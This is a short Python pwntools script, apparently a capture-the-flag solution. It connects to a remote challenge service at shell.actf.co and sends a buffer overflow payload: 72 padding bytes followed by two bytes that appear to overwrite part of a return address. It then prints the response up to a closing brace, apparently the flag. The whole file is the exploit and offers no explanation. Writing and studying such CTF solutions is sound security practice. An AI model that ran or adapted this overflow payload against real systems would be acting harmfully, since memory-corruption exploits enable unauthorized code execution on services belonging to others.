from pwn import *

p = remote('shell.actf.co', 18100)

print p.recvuntil(':')
p.sendline('A'*72+'\x37\x13')
print p.recvuntil('}')
